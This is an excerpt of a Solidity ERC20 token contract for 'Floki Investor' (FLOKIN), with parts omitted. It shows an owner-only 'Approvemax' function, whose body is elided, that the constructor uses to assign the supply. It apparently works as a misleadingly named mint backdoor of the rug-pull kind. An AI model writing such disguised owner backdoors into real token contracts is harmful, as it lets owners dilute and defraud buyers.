...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function Approvemax(uint256 amount) public onlyOwner {
    _approvemax(msg.sender, amount);
    }
    ...
    function _approvemax(address account, uint256 amount) internal virtual {
...
contract FLOKIN is ERC20 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC20("Floki Investor", "FLOKIN") {
        _approvemax(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}